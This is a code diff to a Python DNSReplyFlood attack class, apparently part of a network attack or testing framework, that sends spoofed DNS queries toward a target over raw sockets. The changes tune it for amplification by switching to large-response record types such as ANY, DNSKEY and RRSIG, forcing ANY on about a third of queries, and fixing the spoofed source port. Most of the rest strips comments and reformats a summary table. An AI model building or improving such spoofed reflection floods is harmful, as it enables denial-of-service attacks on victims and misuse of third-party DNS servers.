@@ -68,7 +68,7 @@ NS-3 STYLE PACKET CONSTRUCTION DETAILS:
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                      Transaction ID                           |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-   |QR|   Opcode  |AA|TC|RD|RA|   Z    |        RCODE             |
+   |QR|   Opcode  |AA|TC|RD|RA|   Z    |        RCODE              |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    |                    QDCOUNT (Questions)                        |
    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -115,12 +115,12 @@ NS-3 STYLE PACKET CONSTRUCTION DETAILS:
 """
 
 dns_query_type_dict = {
-    1: "A",
-    28: "AAAA",
-    15: "MX",
-    5: "CNAME",
     2: "NS",
+    15: "MX",
     16: "TXT",
+    46: "RRSIG",
+    48: "DNSKEY",
+    255: "ANY",
 }
 
 
@@ -157,13 +157,13 @@ class DNSReplyFlood(AttackStrategy):
             "amazon.com",
         ]
         self.query_types = query_types or [
-            1,
-            28,
-            15,
-            5,
-            2,
-            16,
-        ]  # A, AAAA, MX, CNAME, NS, TXT
+            2,  # NS
+            15,  # MX
+            16,  # TXT
+            46,  # RRSIG
+            48,  # DNSKEY
+            255,  # ANY
+        ]
 
         # Setup file logger (decoupled from console logger)
         log_path = log_file if log_file else "./dns_reply_flood_attack.log"
@@ -173,10 +173,8 @@ class DNSReplyFlood(AttackStrategy):
         fh.setFormatter(
             logging.Formatter("[%(asctime)s] %(name)s - %(levelname)s - %(message)s")
         )
-        # Remove all handlers before adding
         self.file_logger.handlers.clear()
         self.file_logger.addHandler(fh)
-        # Prevent propagation to root logger (so file logs don't show in console)
         self.file_logger.propagate = False
 
         # Setup console logger (for progress only)
@@ -186,7 +184,6 @@ class DNSReplyFlood(AttackStrategy):
         ch = logging.StreamHandler()
         ch.setFormatter(logging.Formatter("%(message)s"))
         self.console_logger.addHandler(ch)
-        # Prevent propagation to root logger (so console logs don't show in file)
         self.console_logger.propagate = False
 
     def _load_zone_domains(self):
@@ -321,7 +318,6 @@ class DNSReplyFlood(AttackStrategy):
             sock.sendto(complete_packet, (self.target_ip, 0))
             sock.close()
             self.packets_sent += 1
-            # Log DNS request to file only
             req_info = {
                 "timestamp": time.time(),
                 "query_name": domain,
@@ -335,7 +331,6 @@ class DNSReplyFlood(AttackStrategy):
             return True
         except Exception as e:
             err_msg = f"Error sending DNS query: {e}"
-            # Only print errors to console
             console.print(f"[red]{err_msg}[/red]")
             self.file_logger.error(err_msg)
             return False
@@ -358,8 +353,11 @@ class DNSReplyFlood(AttackStrategy):
         while self.attack_active:
             try:
                 domain = self._pick_query_domain()
-                qtype = random.choice(self.query_types)
-                spoofed_port = random.randint(1024, 65535)
+                if random.random() < 0.35:
+                    qtype = 255  # ANY
+                else:
+                    qtype = random.choice(self.query_types)
+                spoofed_port = self.spoofed_port
                 self._send_dns_query(self.spoofed_ip, spoofed_port, domain, qtype)
                 time.sleep(0.01)
             except Exception as e:
@@ -520,7 +518,10 @@ class DNSReplyFlood(AttackStrategy):
             "[bold white]📦 Total Packets Sent[/bold white]",
             f"[{packet_color}]{total_packets:,}[/{packet_color}]",
         )
-        summary_table.add_row("[bold white]⏱️  Duration[/bold white]", f"[cyan]{duration_sec:.2f} seconds[/cyan]")
+        summary_table.add_row(
+            "[bold white]⏱️  Duration[/bold white]",
+            f"[cyan]{duration_sec:.2f} seconds[/cyan]",
+        )
         summary_table.add_row(
             "[bold white]🚀 Average Rate[/bold white]",
             f"[{rate_color}]{avg_rate:.2f} packets/sec[/{rate_color}]",
